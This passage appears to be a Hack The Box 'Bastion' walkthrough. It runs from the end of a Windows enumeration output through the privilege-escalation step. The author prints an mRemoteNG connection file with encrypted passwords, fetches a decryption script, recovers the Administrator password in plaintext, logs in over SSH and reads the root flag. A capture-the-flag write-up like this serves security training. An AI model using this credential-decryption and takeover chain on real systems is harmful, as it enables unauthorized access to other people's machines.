TaskName    : \Microsoft\Windows\WindowsUpdate\Automatic App Update
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\WindowsUpdate\Automatic App Update
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start
Run As User : SYSTEM
Task To Run : C:\Windows\system32\sc.exe start wuauserv

TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start
Run As User : SYSTEM
Task To Run : C:\Windows\system32\sc.exe start wuauserv

TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start
Run As User : SYSTEM
Task To Run : C:\Windows\system32\sc.exe start wuauserv

TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start
Run As User : SYSTEM
Task To Run : C:\Windows\system32\sc.exe start wuauserv

TaskName    : \Microsoft\Windows\WindowsUpdate\sih
Run As User : SYSTEM
Task To Run : %systemroot%\System32\sihclient.exe

TaskName    : \Microsoft\Windows\WindowsUpdate\sihboot
Run As User : SYSTEM
Task To Run : %systemroot%\System32\sihclient.exe /boot

TaskName    : \Microsoft\Windows\Wininet\CacheTask
Run As User : Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Workplace Join\Automatic-Device-Join
Run As User : SYSTEM
Task To Run : %SystemRoot%\System32\dsregcmd.exe

TaskName    : \Microsoft\XblGameSave\XblGameSaveTask
Run As User : SYSTEM
Task To Run : %windir%\System32\XblGameSaveTask.exe standby

TaskName    : \Microsoft\XblGameSave\XblGameSaveTaskLogon
Run As User : SYSTEM
Task To Run : %windir%\System32\XblGameSaveTask.exe logon




-----------------------------------------------------------
 Services
-----------------------------------------------------------


-----------------------------------------------------------
 Installed Programs
-----------------------------------------------------------

-----------------------------------------------------------
 Installed Patches
-----------------------------------------------------------

-----------------------------------------------------------
 Program Folders
-----------------------------------------------------------

C:\Program Files
-------------
Common Files
Internet Explorer
OpenSSH-Win64
PackageManagement
VMware
Windows Defender
Windows Mail
Windows Media Player
Windows Multimedia Platform
Windows NT
Windows Photo Viewer
Windows Portable Devices
WindowsPowerShell


C:\Program Files (x86)
-------------------
Common Files
Internet Explorer
Microsoft.NET
mRemoteNG
Windows Defender
Windows Mail
Windows Media Player
Windows Multimedia Platform
Windows NT
Windows Photo Viewer
Windows Portable Devices
WindowsPowerShell



-----------------------------------------------------------
 Files with Full Control and Modify Access
-----------------------------------------------------------

C:\Backups\note.txt
C:\Backups\note.txt



C:\Users\L4mpje\Desktop\user.txt
C:\Users\L4mpje\jaws-enum.ps1
C:\Users\L4mpje\winPEAS.bat


-----------------------------------------------------------
 Folders with Full Control and Modify Access
-----------------------------------------------------------

C:\Backups\WindowsImageBackup
C:\Backups\WindowsImageBackup
C:\Backups\WindowsImageBackup\L4mpje-PC
C:\Backups\WindowsImageBackup\L4mpje-PC
C:\Backups\WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351
C:\Backups\WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351
C:\Backups\WindowsImageBackup\L4mpje-PC\Catalog
C:\Backups\WindowsImageBackup\L4mpje-PC\Catalog
C:\Backups\WindowsImageBackup\L4mpje-PC\SPPMetadataCache
C:\Backups\WindowsImageBackup\L4mpje-PC\SPPMetadataCache



Failed to read more folders

Failed to read more folders

-----------------------------------------------------------
 Mapped Drives
-----------------------------------------------------------
-----------------------------------------------------------
 Unquoted Service Paths
-----------------------------------------------------------

-----------------------------------------------------------
 Recent Documents
-----------------------------------------------------------

AutomaticDestinations
CustomDestinations
L4mpje.bat.lnk
Startup.lnk
user.txt.lnk



-----------------------------------------------------------
 Potentially Interesting Files in Users Directory
-----------------------------------------------------------
C:\Users\L4mpje\Desktop\user.txt
C:\Users\L4mpje\jaws-enum.ps1
C:\Users\L4mpje\winPEAS.bat

-----------------------------------------------------------
 10 Last Modified Files in C:\User
-----------------------------------------------------------
C:\Users\L4mpje\Links\Desktop.lnk
C:\Users\L4mpje\Links
C:\Users\L4mpje\Desktop
C:\Users\L4mpje\Desktop\user.txt
C:\Users\Administrator
C:\Users\L4mpje\winPEASx64.exe
C:\Users\L4mpje\winPEASx86.exe
C:\Users\L4mpje\winPEAS.bat
C:\Users\L4mpje
C:\Users\L4mpje\jaws-enum.ps1

-----------------------------------------------------------
 MUICache Files
-----------------------------------------------------------
C:\Windows\system32\NOTEPAD.EXE.FriendlyAppName
C:\Windows\system32\NOTEPAD.EXE.ApplicationCompany

-----------------------------------------------------------
 System Files with Passwords
-----------------------------------------------------------

-----------------------------------------------------------
 AlwaysInstalledElevated Registry Key
-----------------------------------------------------------

-----------------------------------------------------------
 Stored Credentials
-----------------------------------------------------------

Currently stored credentials:

* NONE *

-----------------------------------------------------------
 Checking for AutoAdminLogon
-----------------------------------------------------------


PS C:\Users\L4mpje>
PS C:\Users\L4mpje>
```

Output is quite long, but we notice an uncommon application:

```
C:\Program Files (x86)
-------------------
Common Files
Internet Explorer
Microsoft.NET
mRemoteNG <=========================================
Windows Defender
Windows Mail
Windows Media Player
Windows Multimedia Platform
Windows NT
Windows Photo Viewer
Windows Portable Devices
WindowsPowerShell
```

We look for something relevant with `mRemoteNG`:

```
l4mpje@BASTION c:\Program Files (x86)>dir
 Volume in drive C has no label.
 Volume Serial Number is 0CB3-C487

 Directory of c:\Program Files (x86)

22-02-2019  15:01    <DIR>          .
22-02-2019  15:01    <DIR>          ..
16-07-2016  15:23    <DIR>          Common Files
23-02-2019  10:38    <DIR>          Internet Explorer
16-07-2016  15:23    <DIR>          Microsoft.NET
22-02-2019  15:01    <DIR>          mRemoteNG
23-02-2019  11:22    <DIR>          Windows Defender
23-02-2019  10:38    <DIR>          Windows Mail
23-02-2019  11:22    <DIR>          Windows Media Player
16-07-2016  15:23    <DIR>          Windows Multimedia Platform
16-07-2016  15:23    <DIR>          Windows NT
23-02-2019  11:22    <DIR>          Windows Photo Viewer
16-07-2016  15:23    <DIR>          Windows Portable Devices
16-07-2016  15:23    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              14 Dir(s)  11.250.176.000 bytes free

l4mpje@BASTION c:\Program Files (x86)>cd mRemoteNG

l4mpje@BASTION c:\Program Files (x86)\mRemoteNG>dir
 Volume in drive C has no label.
 Volume Serial Number is 0CB3-C487

 Directory of c:\Program Files (x86)\mRemoteNG

22-02-2019  15:01    <DIR>          .
22-02-2019  15:01    <DIR>          ..
18-10-2018  23:31            36.208 ADTree.dll
18-10-2018  23:31           346.992 AxInterop.MSTSCLib.dll
18-10-2018  23:31            83.824 AxInterop.WFICALib.dll
18-10-2018  23:31         2.243.440 BouncyCastle.Crypto.dll
18-10-2018  23:30            71.022 Changelog.txt
18-10-2018  23:30             3.224 Credits.txt
22-02-2019  15:01    <DIR>          cs-CZ
22-02-2019  15:01    <DIR>          de
22-02-2019  15:01    <DIR>          el
22-02-2019  15:01    <DIR>          en-US
22-02-2019  15:01    <DIR>          es
22-02-2019  15:01    <DIR>          es-AR
22-02-2019  15:01    <DIR>          Firefox
22-02-2019  15:01    <DIR>          fr
18-10-2018  23:31         1.966.960 Geckofx-Core.dll
05-07-2017  01:31         4.482.560 Geckofx-Core.pdb
18-10-2018  23:31           143.728 Geckofx-Winforms.dll
05-07-2017  01:31           259.584 Geckofx-Winforms.pdb
22-02-2019  15:01    <DIR>          Help
22-02-2019  15:01    <DIR>          hu
22-02-2019  15:01    <DIR>          Icons
18-10-2018  23:31           607.088 Interop.MSTSCLib.dll
18-10-2018  23:31           131.440 Interop.WFICALib.dll
22-02-2019  15:01    <DIR>          it
22-02-2019  15:01    <DIR>          ja-JP
22-02-2019  15:01    <DIR>          ko-KR
07-10-2018  13:21            18.326 License.txt
18-10-2018  23:31           283.504 log4net.dll
18-10-2018  23:31           412.528 MagicLibrary.dll
18-10-2018  23:31         1.552.240 mRemoteNG.exe
07-10-2018  13:21            28.317 mRemoteNG.exe.config
18-10-2018  23:30         2.405.888 mRemoteNG.pdb
22-02-2019  15:01    <DIR>          nb-NO
22-02-2019  15:01    <DIR>          nl
18-10-2018  23:31           451.952 ObjectListView.dll
22-02-2019  15:01    <DIR>          pl
22-02-2019  15:01    <DIR>          pt
22-02-2019  15:01    <DIR>          pt-BR
07-10-2018  13:21           707.952 PuTTYNG.exe
07-10-2018  13:21               887 Readme.txt
18-10-2018  23:31           415.088 Renci.SshNet.dll
22-02-2019  15:01    <DIR>          ru
22-02-2019  15:01    <DIR>          Schemas
22-02-2019  15:01    <DIR>          Themes
22-02-2019  15:01    <DIR>          tr-TR
22-02-2019  15:01    <DIR>          uk
18-10-2018  23:31           152.432 VncSharp.dll
18-10-2018  23:31           312.176 WeifenLuo.WinFormsUI.Docking.dll
18-10-2018  23:31            55.152 WeifenLuo.WinFormsUI.Docking.ThemeVS2003.dll
18-10-2018  23:31           168.816 WeifenLuo.WinFormsUI.Docking.ThemeVS2012.dll
18-10-2018  23:31           217.968 WeifenLuo.WinFormsUI.Docking.ThemeVS2013.dll
18-10-2018  23:31           243.056 WeifenLuo.WinFormsUI.Docking.ThemeVS2015.dll
22-02-2019  15:01    <DIR>          zh-CN
22-02-2019  15:01    <DIR>          zh-TW
              28 File(s)     17.802.352 bytes
              28 Dir(s)  11.250.176.000 bytes free

l4mpje@BASTION c:\Program Files (x86)\mRemoteNG>cd c:\Users\L4mpje

l4mpje@BASTION c:\Users\L4mpje>dir
 Volume in drive C has no label.
 Volume Serial Number is 0CB3-C487

 Directory of c:\Users\L4mpje

13-05-2021  23:35    <DIR>          .
13-05-2021  23:35    <DIR>          ..
22-02-2019  16:26    <DIR>          Contacts
22-02-2019  16:27    <DIR>          Desktop
22-02-2019  16:26    <DIR>          Documents
22-02-2019  16:26    <DIR>          Downloads
22-02-2019  16:26    <DIR>          Favorites
13-05-2021  23:35            16.974 jaws-enum.ps1
22-02-2019  16:26    <DIR>          Links
22-02-2019  16:26    <DIR>          Music
22-02-2019  16:26    <DIR>          Pictures
22-02-2019  16:26    <DIR>          Saved Games
22-02-2019  16:26    <DIR>          Searches
22-02-2019  16:26    <DIR>          Videos
13-05-2021  23:13            35.107 winPEAS.bat
13-05-2021  23:10           117.826 winPEASx64.exe
13-05-2021  23:10           117.826 winPEASx86.exe
               4 File(s)        287.733 bytes
              13 Dir(s)  11.250.176.000 bytes free

l4mpje@BASTION c:\Users\L4mpje>cd Appdata

l4mpje@BASTION c:\Users\L4mpje\AppData>cd Roaming

l4mpje@BASTION c:\Users\L4mpje\AppData\Roaming>dir
 Volume in drive C has no label.
 Volume Serial Number is 0CB3-C487

 Directory of c:\Users\L4mpje\AppData\Roaming

22-02-2019  15:01    <DIR>          .
22-02-2019  15:01    <DIR>          ..
22-02-2019  14:50    <DIR>          Adobe
22-02-2019  15:03    <DIR>          mRemoteNG
               0 File(s)              0 bytes
               4 Dir(s)  11.250.176.000 bytes free

l4mpje@BASTION c:\Users\L4mpje\AppData\Roaming>cd mRemoteNG

l4mpje@BASTION c:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir
 Volume in drive C has no label.
 Volume Serial Number is 0CB3-C487

 Directory of c:\Users\L4mpje\AppData\Roaming\mRemoteNG

22-02-2019  15:03    <DIR>          .
22-02-2019  15:03    <DIR>          ..
22-02-2019  15:03             6.316 confCons.xml
22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup
22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup
22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup
22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup
22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup
22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup
22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup
22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup
22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup
22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup
22-02-2019  15:03                51 extApps.xml
22-02-2019  15:03             5.217 mRemoteNG.log
22-02-2019  15:03             2.245 pnlLayout.xml
22-02-2019  15:01    <DIR>          Themes
              14 File(s)         76.577 bytes
               3 Dir(s)  11.250.176.000 bytes free
```

We check on `confCons.xml` file:

```
l4mpje@BASTION c:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GC
M" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0
oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Userna
me="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
 Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" Rend
eringEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeo
ut="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" Disp
layThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" R
edirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" Redire
ctKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEn
coding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPa
ssword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostna
me="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="
false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnab
leFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" I
nheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false"
 InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" Inhe
ritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleS
ession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="fa
lse" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoad
BalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" Inheri
tExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false"
InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNC
Colors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHo
stname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false
" InheritRDGatewayDomain="false" />
    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128"
 Username="L4mpje" Domain="" Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB" Hostnam
e="192.168.1.75" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" Rendering
Engine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="f
alse" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayTh
emes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" Redire
ctPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKey
s="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncodin
g="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPasswor
d="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname=""
 RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false
" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFon
tSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" Inheri
tPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" Inhe
ritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRe
directSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSessio
n="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false"
InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalan
ceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtA
pp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" Inher
itVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColor
s="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostnam
e="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" Inh
eritRDGatewayDomain="false" />
</mrng:Connections>
```

We found an interesting line:

```
"Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
```

Then we use `mremoteng_decrypt`:

```
root@kali:/opt/htb/Bastion# wget https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py
--2021-05-14 00:09:11--  https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1535 (1.5K) [text/plain]
Saving to: ‘mremoteng_decrypt.py’

mremoteng_decrypt.py                    100%[=============================================================================>]   1.50K  --.-KB/s    in 0s

2021-05-14 00:09:12 (6.70 MB/s) - ‘mremoteng_decrypt.py’ saved [1535/1535]
```

We run that script with our previous string:

```
root@kali:/opt/htb/Bastion# python3 mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
Password: thXLHM96BeKL0ER2
```

Now we can access through SSH as Administrator and grab flag:

```
root@kali:/opt/htb/Bastion# ssh Administrator@10.10.10.134
Administrator@10.10.10.134's password:
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

administrator@BASTION C:\Users\Administrator>whoami
bastion\administrator

administrator@BASTION C:\Users\Administrator>cd Desktop

administrator@BASTION C:\Users\Administrator\Desktop>type root.txt
958850b91811676ed6620a9c430e65c8
administrator@BASTION C:\Users\Administrator\Desktop>
```







